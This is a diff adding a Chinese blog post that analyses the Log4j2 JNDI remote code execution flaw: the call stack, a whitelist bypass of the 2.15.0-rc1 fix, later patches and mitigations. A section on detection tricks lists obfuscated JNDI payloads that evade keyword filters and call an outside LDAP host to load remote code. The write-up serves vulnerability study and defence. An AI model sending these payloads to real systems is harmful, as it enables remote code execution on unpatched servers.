class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以直接在javax.naming.InitialContext#lookup方法下断点得到整个调用栈方便跟踪整个流程：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">lookup:<span class="number">172</span>, JndiManager (org.apache.logging.log4j.core.net)</span><br><span class="line">lookup:<span class="number">56</span>, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:<span class="number">221</span>, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:<span class="number">1110</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">1033</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">912</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:<span class="number">467</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:<span class="number">132</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:<span class="number">38</span>, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:<span class="number">344</span>, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:<span class="number">244</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">229</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">59</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:<span class="number">197</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:<span class="number">190</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:<span class="number">181</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:<span class="number">156</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:<span class="number">129</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:<span class="number">120</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:<span class="number">84</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:<span class="number">540</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:<span class="number">498</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">481</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">456</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">82</span>, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">161</span>, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:<span class="number">2205</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:<span class="number">2159</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:<span class="number">2142</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:<span class="number">2017</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:<span class="number">1983</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">error:<span class="number">740</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:<span class="number">17</span>, RceTest (com.ttestoo.Test)</span><br></pre></td></tr></table></figure>
+
+<p>接着正向分析，首先在LoggerConfig#processLogEvent中通过调用Appender对日志事件进行处理：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642599291409-9224c309-6f4e-489b-83e0-cce25cdf9384.png" alt="img"></p>
+<p>来到LoggerConfig#callAppenders，看到循环调用所有的Appender（可理解为日志输出的方式，可通过配置文件配置多个，例如：ConsoleAppender、FileAppender等）处理日志事件，这里仅配置了一个ConsoleAppender：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642599814563-ddb753bd-89a0-43d2-b5d2-ca0c490275b4.png" alt="img"></p>
+<p>log4j有多个自带的Appender，所有的Appender均直接继承自AbstractOutputStreamAppende：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642600155484-ad718b11-b76a-406d-b96c-b6e1e405d094.png" alt="img"></p>
+<p>其中ConsoleAppender未重新append方法，所以此时将调用AbstractOutputStreamAppende#append方法，并最终在AbstractOutputStreamAppender#directEncodeEvent中通过调用PatternLayout#encode开启消息的格式化处理：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642600602776-984a28ac-a6a3-4fb6-ba8e-8834d2668e8b.png" alt="img"></p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642602215561-1e049ebe-475a-416f-8999-729090d28a8e.png" alt="img"></p>
+<p>接着在PatternLayout中获取具体的formatter完成消息格式化，当处理到传入的message：${jndi:ldap://xx:8088/exp}时，则通过MessagePatternConverter#format格式化处理；</p>
+<p>这里可清楚看到，当config存在且nolookups不为true时（重点，后面修复会涉及到），则开始匹配message中包含 ‘${‘ 时会通过StrSubstitutor#replace进行替换其中的内容（即进行lookup操作，将返回结果替换${}中的内容）：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642603562969-d287cbca-deed-4453-9ec9-ea62e3edabd9.png" alt="img"></p>
+<p>那么触发jndi命令执行的核心点则在替换的过程中，即在StrSubstitutor#substitute方法中，循环查找 &amp;{ 前缀：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642604041071-804e1b5c-3884-4758-889c-94deb0fb3de6.png" alt="img"></p>
+<p>当找到 &amp;{ 前缀后继续寻找后缀，注意这个过程中存在一个递归查找前后缀的过程（为了满足存在嵌套的场景，后面会讲到可用此特性来绕过一些防护策略，也是之后拒绝服务问题的原因）：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642605118052-df7541e4-29a2-461f-9b0e-7dbb234a0ff4.png" alt="img"></p>
+<p>接下来会有一个匹配处理 ‘:-‘ 的过程：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642607192849-015f0c80-34fe-41ea-98d8-63fecd7a752a.png" alt="img"></p>
+<p>对于 ‘:-‘ 可在类注释中了解到一些信息，效果就是匹配到 ${a:-b} 时会被处理为b：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642605669349-383a4c18-6dd5-4f34-9f48-39ec8e3be718.png" alt="img"></p>
+<p>处理结束后会调用resolveVariable方法解析变量，这里即为传入的jndi:ldap://120.48.16.203:8088/exp</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642606086494-e8b07b4a-e40f-4d5a-984b-576e78bd9d75.png" alt="img"></p>
+<p>在StrSubstitutor#resolveVariable中则会调用Interpolator#lookup处理：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642606532755-ceabf0ee-be49-467b-971f-89051faf19c7.png" alt="img"></p>
+<p>在Interpolator类注释中可知此类主要用来代理所有的StrLookup，而StrLookup是在Interpolator类初始化时放入的支持的类型（版本不同支持的有所差别）：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642606570036-d76c9b0a-b131-4d97-8362-bffd1d270111.png" alt="img"></p>
+<p>这里由于传入的payload为 ‘jndi:’ 开头，则会通过org.apache.logging.log4j.core.lookup.JndiLookup#lookup处理：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642606644360-f4305336-43c1-4e40-9111-36f14e9806b4.png" alt="img"></p>
+<p>在JndiLookup#lookup中则直接使用JndiManager进行lookup操作触发jndi查询：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642606827088-92299108-d03a-4742-8acb-0a70a26ec062.png" alt="img"></p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642606848858-49d5d696-cc71-4a43-8b18-e05a80c080cd.png" alt="img"></p>
+<h1 id="2-15-0-rc1的绕过"><a href="#2-15-0-rc1的绕过" class="headerlink" title="2.15.0 rc1的绕过"></a>2.15.0 rc1的绕过</h1><p>在2.15.0 rc1中主要做了两个主要的变更：</p>
+<p>1、消息格式化的过程默认不会处理’${}’，可通过配置开启lookups；</p>
+<p>负责消息格式化处理的MessagePatternConverter类发生了变更，增加了4个内部类，每个内部类都有各自的format方法，且只有LookupMessagePatternConverter的format方法会处理 ‘&amp;{}’ 字符：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642671087908-e0b1898e-9dfd-4146-b118-fe34f78cafd8.png" alt="img"></p>
+<p>且在实例化MessagePatternConverter时，默认为SimpleMessagePatternConverter进行消息格式化，只有在lookups为true时才会通过LookupMessagePatternConverter进行格式化（loadLookups方法中可看到默认lookup为false）：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642672633657-eb7c4e04-236e-453c-89f5-0d5122b2fcba.png" alt="img"></p>
+<p><strong>所以绕过的前提条件需要手工开启lookups（这个门槛就已经很高了）</strong>，可通过在配置文件中加{lookups}开启：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg&#123;lookups&#125;%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时在实例化MessagePatternConverter时，由于配置了lookups，则最终会通过LookupMessagePatternConverter的format进行消息格式化：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642673211171-6c8105db-7ea1-4130-baca-8318c00bcd69.png" alt="img"></p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642673344991-844c406f-e9fc-412b-9a7f-ce1f737916d3.png" alt="img"></p>
+<p>2、通过JndiManagerFactory#createManager创建JndiManager，且在JndiManager#lookup中进行白名单校验lookup的主机地址；</p>
+<p>消息格式化处理完成后，在解析&amp;{}内容时，通过JndiManagerFactory#createManager创建JndiManager，其中增加了三个属性：allowedHosts、</p>
+<p>allowedClasses、allowedProtocols，其中allowedHosts中仅为本机和内网ip：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642679225679-87721144-0425-4b39-83f2-f87a8020a341.png" alt="img"></p>
+<p>在JndiManager#lookup中对lookup的地址进行白名单校验，不通过则不会执行后面的this.context.lookup(name)操作：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642681293988-77f1ef81-93ad-4ce3-b238-c358ae3798d8.png" alt="img"></p>
+<p>问题出在当遇到URISyntaxException异常时并没有中断执行，而是继续触发了lookup操作：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642680055090-9e57d708-8fb0-4aff-bd8f-62d0cfff5ac1.png" alt="img"></p>
+<p>综上，<strong>在手工开启lookups的前提下</strong>，只要在实例化URI时触发URISyntaxException异常即可绕过2.15.0-rc1的白名单校验，可通过在url后面加个空格即可：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642681441750-0af2e828-7368-4e3a-b3bd-a069f15bad5a.png" alt="img"></p>
+<p>成功绕过2.15.0-rc1的修复：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642681514695-85cf3bc7-de28-4f90-b861-9d00dec3642d.png" alt="img"></p>
+<h1 id="2-15-0-rc2的修复"><a href="#2-15-0-rc2的修复" class="headerlink" title="2.15.0 rc2的修复"></a>2.15.0 rc2的修复</h1><p>遇到异常直接return：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642681652349-2163808a-784b-4bea-a413-23353386d15a.png" alt="img"></p>
+<h1 id="后续的迭代"><a href="#后续的迭代" class="headerlink" title="后续的迭代"></a>后续的迭代</h1><p>2.15.0-rc2后，起初增加了配置默认不支持jndi查询：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/commit/c362aff473e9812798ff8f25f30a2619996605d5#">https://github.com/apache/logging-log4j2/commit/c362aff473e9812798ff8f25f30a2619996605d5#</a></p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642682806106-d1cac338-ad5b-4ff0-821d-cc7e95f39aae.png" alt="img"></p>
+<p>再后直接删除了MessagePatternConverter中LookupMessagePatternConverter这个内部类：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/commit/27972043b76c9645476f561c5adc483dec6d3f5d">https://github.com/apache/logging-log4j2/commit/27972043b76c9645476f561c5adc483dec6d3f5d</a></p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642683165894-18dc8ee3-eda2-4521-91d6-73eb2fe6b55f.png" alt="img"></p>
+<h1 id="检测技巧"><a href="#检测技巧" class="headerlink" title="检测技巧"></a>检测技巧</h1><p>此部分主要是看到<a target="_blank" rel="noopener" href="https://tttang.com/archive/1378/%E6%96%87%E7%AB%A0%E4%B8%AD%E5%88%86%E4%BA%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%A3%80%E6%B5%8B%E6%8A%80%E5%B7%A7%E5%81%9A%E4%B8%80%E4%B8%AA%E8%AE%B0%E5%BD%95%EF%BC%9B">https://tttang.com/archive/1378/文章中分享的一些检测技巧做一个记录；</a></p>
+<h2 id="利用-拼接关键词"><a href="#利用-拼接关键词" class="headerlink" title="利用:-拼接关键词"></a>利用:-拼接关键词</h2><p>前面漏洞分析部分讲过在StrSubstitutor#substitute方法中会对 :- 特殊字符进行单独处理，可用来混淆关键词，例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;:::-j&#125;$&#123;a:-n&#125;$&#123;<span class="number">11</span>:-d&#125;$&#123;asdf:-i&#125;:ldap:<span class="comment">//120.48.16.203:8088/exp&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="编码关键词"><a href="#编码关键词" class="headerlink" title="编码关键词"></a>编码关键词</h2><p> ı(\u0131) 经过toUpperCase会转变成I(\u0049)：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jnd$&#123;upper:\u0131&#125;:ldap:<span class="comment">//120.48.16.203:8088/exp&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>也可：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jn$&#123;upper:\u0064&#125;i:ldap:<span class="comment">//120.48.16.203:8088/exp&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="嵌套"><a href="#嵌套" class="headerlink" title="${}嵌套"></a>${}嵌套</h2><p>上文中讲过在StrSubstitutor#substitute方法中会进行递归解析处理，可通过嵌套增加payload的复杂度：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;jndi:ldap:<span class="comment">//120.48.16.203:8088/exp&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="通过env等快速定位问题主机"><a href="#通过env等快速定位问题主机" class="headerlink" title="通过env等快速定位问题主机"></a>通过env等快速定位问题主机</h2><p>直接获取系统信息、环境变量、属性配置、JVM参数等信息来快速定位受影响的主机：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.error(<span class="string">&quot;$&#123;hostName&#125;&quot;</span>);    <span class="comment">// 快速定位主机</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="一些疑问"><a href="#一些疑问" class="headerlink" title="一些疑问"></a>一些疑问</h1><p>1、Log4j 1.x和Log4j 2.x有什么关系？</p>
+<p>Log4j2是Log4j 1.x的重写，相较于Log4j 1.x、logback等性能更高；</p>
+<p>2、slf4j做什么用的？</p>
+<p>slf4j是一个抽象层，底层可使用任意的组件来进行日志记录，与直接使用log4j2获取Logger对象稍有不同：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// log4j-api</span></span><br><span class="line">org.apache.logging.log4j.Logger logger = LogManager.getLogger();</span><br><span class="line"></span><br><span class="line"><span class="comment">// slf4j-api</span></span><br><span class="line">org.slf4j.Logger logger = LoggerFactory.getLogger(RceTest.class);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3、什么场景下的Log4j 2.x才会存在漏洞？</p>
+<ul>
+<li>直接或间接使用log4j2.x打日志，不管info()、error()等均存在漏洞，只是取决于配置的日志输出等级；</li>
+</ul>
+<p>4、Log4j 1.x是否存在漏洞？</p>
+<p>本质上是存在的，但是需要通过log4j的配置才能触发到，且需要相关的依赖，个人感觉研究意义不大这里不详细记录；</p>
+<p>补充，详情可参考：<a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1131.html">https://www.cnpanda.net/sec/1131.html</a></p>
+<p>5、Logback是否存在漏洞？</p>
+<p>与log4j1.x、2.x类似，在logback中同样存在类似的Appender，可通过配置进行触发rce，这里不多花时间，同样可参考：<a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1131.html">https://www.cnpanda.net/sec/1131.html</a></p>
+<p>6、Springboot项目如何触发？</p>
+<p>springboot项目中默认使用logback记录日志，需要排除spring-boot-starter-logging：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        springboot log4j2依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-log4j2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.14.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h1><p>如果想从根本上解决本次爆出的问题：</p>
+<ul>
+<li>使用到lookup（jndi的lookup尽量不用），可更新到2.15.0（官方发布的包，仓库可直接获取，是对rc1的修复版本）；</li>
+<li>没用到lookup可直接更新到2.16.0（官方发的包，移除了lookup功能）</li>
+</ul>
+<p>升级log4j困难的场景：</p>
+<ul>
+<li>移除log4j-core包中的jndi对应的JndiLookup.class文件以删除jndi的支持；</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参考命令：</span><br><span class="line">zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>2.10开始可通过设置formatMsgNoLookups为true来关闭lookup：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jvm启动参数：-Dlog4j2.formatMsgNoLookups=<span class="keyword">true</span>（-Dlog4j.formatMsgNoLookups=<span class="keyword">true</span>）</span><br><span class="line">log4j配置文件：log4j2.formatMsgNoLookups=True</span><br></pre></td></tr></table></figure>
+
+<p>注：以上两种方式在企业中很容易在业务调整时被遗漏导致后期出现问题！！！</p>
+<p>其他缓解措施：</p>
+<ul>
+<li><p>关闭主动外连网（企业安全域划分或者网络治理时尽量默认关闭服务器主动外联网，如有需求可走dmz区等外层的统一代理）；</p>
+</li>
+<li><p>保证jdk在11.0.1、8u191、7u201、6u211及以上，且禁止配置com.sun.jndi.ldap.object.trustURLCodebase为true；</p>
+</li>
+<li><p>waf等等设备</p>
+</li>
+</ul>
+<h1 id="个人思考"><a href="#个人思考" class="headerlink" title="个人思考"></a>个人思考</h1><p>此漏洞确实影响很大，但是不应该在未搞清楚修复方案到底是否有效、会不会影响业务等情况下着急进行修复；</p>
+<p>例如</p>
+<p>1、修改formatMsgNoLookups配置的缓解措施其，在未看到2.10.0才有效的前提下，我个人有尝试验证过，记得当时刚好用的2.0.1，尝试验证多次均未发现可修复漏洞，特意去翻了代码发现2.0.1中根本就没有formatMsgNoLookups这个配置，而2.14.1中确实存在配置且默认为false，当时截的图如下：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642837169970-a7c4aa03-e657-4c58-997c-19fc06d6f77f.png" alt="img"></p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642837252515-0562d8cb-280d-4bb7-bca5-57b6d4e23cba.png" alt="img"></p>
+<p>代码中也明确说明了是从2.10开始才增加的：</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642837302430-eaf67724-c724-414b-975a-65578d1a5b20.png" alt="img"></p>
+<p>但是在很多安全公告推荐的修复方案中并没什么说明。。。</p>
+<p>2、针对jvm加参数有些也离谱，难道不应该是：java -Dlog4j2.formatMsgNoLookups=true -jar xxx.jar吗？</p>
+<p>下图中将参数放到了最后面：java -jar xxx.jar <strong>-Dlog4j2.formatMsgNoLookups=true</strong>，我起初是参考的这个公告，但是在2.14.1上验证也是修复无效的，搞得我都怀疑人生了。。。</p>
+<p><img src="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1642837553368-dd3bebb1-36ab-43ce-bb0c-abdaddd1228d.png" alt="img"></p>
+<p>很多东西确实是需要自己验证过才能相信的，这样记忆也更深刻些，当然绿盟的大佬还是大佬！！！</p>
+<h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>现在通常我是通过看业务代码来确认是否存在以上问题，因为就算用的低版本log4j2，黑盒状态下我也不太清楚哪些controller调用的service中打了日志。。。</p>
+<p>后面会再记录下springboot项目中如何更好的验证是否存在漏洞。。。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/commits/release-2.x?after=895e9306f64a3d58e42775dc0168613908ed9d80+454&amp;branch=release-2.x">https://github.com/apache/logging-log4j2/commits/release-2.x?after=895e9306f64a3d58e42775dc0168613908ed9d80+454&amp;branch=release-2.x</a>  commit记录</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/log4j-2.3/manual/lookups.html#JndiLookup">https://logging.apache.org/log4j/log4j-2.3/manual/lookups.html#JndiLookup</a>    </p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1378/">https://tttang.com/archive/1378/</a>    检测绕过方式</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a></p>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ttestoo.github.io/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%90%8D%E6%8B%BC%E6%8E%A5%E5%9C%BA%E6%99%AF/">
+
